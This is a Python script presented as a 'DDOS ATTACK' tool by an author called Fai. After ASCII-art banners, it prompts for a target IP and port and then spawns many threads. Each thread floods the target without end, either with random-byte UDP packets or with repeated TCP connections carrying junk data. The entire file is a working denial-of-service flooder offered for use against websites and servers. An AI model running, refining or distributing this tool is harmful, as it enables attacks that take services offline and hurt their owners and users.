import random
import socket
import threading
import platform


if platform.system() == 'Windows':

	print("""
  BY Fai


────────────────────────────────────────────────────────────────────────────────
─┏━━━━┓┏━━━┓┏━━━┓┏━┓┏━┓━━━━┏┓━━┏┓┏━━━┓
┃┏┓┏┓┃┃┏━━┛┃┏━┓┃┃┃┗┛┃┃━━━━┃┗┓┏┛┃┃┏━┓┃
┗┛┃┃┗┛┃┗━━┓┃┃━┃┃┃┏┓┏┓┃━━━━┗┓┃┃┏┛┗┛┏┛┃
━━┃┃━━┃┏━━┛┃┗━┛┃┃┃┃┃┃┃━━━━━┃┗┛┃━┏━┛┏┛
━┏┛┗┓━┃┗━━┓┃┏━┓┃┃┃┃┃┃┃━━━━━┗┓┏┛━┃┃┗━┓
━┗━━┛━┗━━━┛┗┛━┗┛┗┛┗┛┗┛━━━━━━┗┛━━┗━━━┛
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
────────────────────────────────────────────────────────────────────────────────
Created by Fai

	""")
else :
	print("""
 TEAM Fai V2


┏━━━━┳━━━┳━━━┳━┓┏━┓
┃┏┓┏┓┃┏━━┫┏━┓┃┃┗┛┃┃
┗┛┃┃┗┫┗━━┫┃╋┃┃┏┓┏┓┃
╋╋┃┃╋┃┏━━┫┗━┛┃┃┃┃┃┃
╋╋┃┃╋┃┗━━┫┏━┓┃┃┃┃┃┃
╋╋┗┛╋┗━━━┻┛╋┗┻┛┗┛┗┛
┏┓╋╋┏┳━━━┓
┃┗┓┏┛┃┏━┓┃
┗┓┃┃┏┻┛┏┛┃
╋┃┗┛┃┏━┛┏┛
╋┗┓┏┛┃┃┗━┓
╋╋┗┛╋┗━━━┛

		""")


print(" DDOS ATTACK BY Fai ")
ip= str(input(" HOST/IP :"))
port= int(input("PORT WEB 80/PORT VPS 22:"))
choice = str(input("ATTACK/HOST?? (Y/N) :"))
times= int(input("PACKETS MIN 100:"))
threads= int(input("THREADS MIN 110 :"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[-]","[•]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"ATTACK ON !!")
		except:
			print("[!] OTW ATTACK WEBSITE/VPS!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[-]","[+]","[x]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"ATTACK ON!!")
		except:
			s.close()
			print("[*] OTW ATTACK WEBSITE/VPS")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
